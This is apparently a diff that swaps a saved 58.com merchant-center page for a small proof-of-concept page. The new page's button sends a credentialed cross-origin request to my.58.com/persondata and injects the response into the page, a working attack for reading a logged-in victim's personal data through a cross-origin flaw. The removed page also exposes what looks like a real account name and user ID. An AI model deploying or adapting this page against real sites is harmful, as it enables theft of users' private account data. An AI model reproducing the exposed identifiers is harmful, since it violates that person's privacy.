@@ -1,79 +1,24 @@
-
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"/> 
-<title>商家中心</title> 
-<link href="//c.58cdn.com.cn/crop/biz/pc/vip_new/css/vipPageHasSideBar_v20200407161608.css" rel="stylesheet" type="text/css" />
-    <link href="//c.58cdn.com.cn/lbg/vip/vip/css/vip_merchant_new_v0.css" rel="stylesheet" type="text/css" />
-    <script type="text/javascript" src="//j2.58cdn.com.cn/vip/js/jquery-1.7.2.min.js"></script>
-    <script type="text/javascript" src="//j1.58cdn.com.cn/lbg/vip/vip/js/inc_index_v0.js"></script>
-    <script type="text/javascript" src="//j1.58cdn.com.cn/crop/pc/biz/vip/vip/js/commonpop_v20151230152803.js"></script>
-    <!--<script type="text/javascript" src="//j1.58cdn.com.cn/lbg/vip/vip/js/3_v20170323154847.js"></script>-->
-    <script type="text/javascript" src="//j1.58cdn.com.cn/webim/js/entry_v20220110145252.js"></script>
-    <script language="javascript" type="text/javascript" src="//j1.58cdn.com.cn/crop/ecom/pc/vCenter/approve/js/vipwmda_v20180730154939.js"></script>
-    <script type="text/javascript" src="//j1.58cdn.com.cn/wmda/js/statistic_v20220104171711.js"></script>
-    <script type="text/javascript" src="//j1.58cdn.com.cn/crop/ecom/pc/vCenter/popup_v20190402154207.js"></script>
-    <script type="text/javascript">document.domain = '58.com';</script>
-<script type="text/javascript">
-        var vipHomePageData;
-        var user = {
-        		name: "pvfhz916g",
-        		userid: "85962910116871",
-        		isCrmLogin:"",
-        		funcUrl:"//my.58.com/persondata?r=0.9720717458351336?r=0.6700987169375356&r=0.815835008041147",
-                resourcepline:"0",
-                plineList:"0",
-                isHuangYeVip:false,
-                isFangChanVip:false
-        }
-
-        $.ajax({
-        	async:false,
-            type: "GET",
-            url: "/menu/vcenter/iddata/",
-            dataType: "json",
-            success: function(data){
-            	vipHomePageData =data;
-            }
-        })
-
-　　
-</script>
-<script language="javascript" type="text/javascript" src="//j1.58cdn.com.cn/crop/biz/pc/vip_new/js/boundle.min_v20161228113243.js"></script>
-</head>
+<!DOCTYPE html>
+<html>
 <body>
-<script type="text/javascript">
-        var _trackURL = "{'cate':'','area':'','pagetype':'vip','page':'merchant_kh','GA_pageview':'/vip/footkh/'}";
-    </script>
-<script type="text/javascript" src="//tracklog.58.com/referrer4.js"></script>
-<script type="text/javascript" src="//j1.58cdn.com.cn/crop/biz/pc/vip_new/js/browser-detection_v20171019201449.js"></script>
-<script language="javascript" type="text/javascript" src="//j1.58cdn.com.cn/crop/biz/pc/vip_new/js/vipPageHasSideBar_v20210125162220.js"></script>
-<!--内部刷新用jS-->
-<script type="text/javascript" charset="gb2312" src="//j1.58cdn.com.cn/lbg/vip/vip/js/3_v20170323154847.js"></script>
-<script type="text/javascript">
-    function ResizeFrame(iframe) {
-        try {
-            iframe=iframe||getSubframe();
-            var height = Math.max(iframe.contentWindow.document.body.scrollHeight, iframe.contentWindow.document.documentElement.scrollHeight);
-            height=Math.max(600,height);
-            if(oldheight!=height){
-                iframe.style.height = height + "px";
-            }
-            oldheight=height;
-        }
-        catch (ex) {}
-    }
-</script>
-<script language="javascript" type="text/javascript" src="//j1.58cdn.com.cn/lbg/vip/vip/js/closecallback_v0.js"></script><script type="text/javascript">
-    try{
-					clickLog('from=merchent_frame_'+'/vcenter/iddata/'+'_'+'85962910116871');
-			}catch(e){
-		
-	}
-</script>
-<script type="text/javascript" src="//j1.58cdn.com.cn/crop/ecom/pc/watermark/js/watermark-util_v20210123000229.js"></script>
-</body>
+<div id="demo">
+<h1> get balenc </h1>
+<button type="button" onclick="loadDoc()">click me</button>
 
+</div>
+<script>
+function loadDoc() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML =
+      this.responseText;
+    }
+  };
+  xhttp.withCredentials=true;
+  xhttp.open("GET","https://my.58.com/persondata",true)
+  xhttp.send();
+}
+</script>
+</body>
 </html>
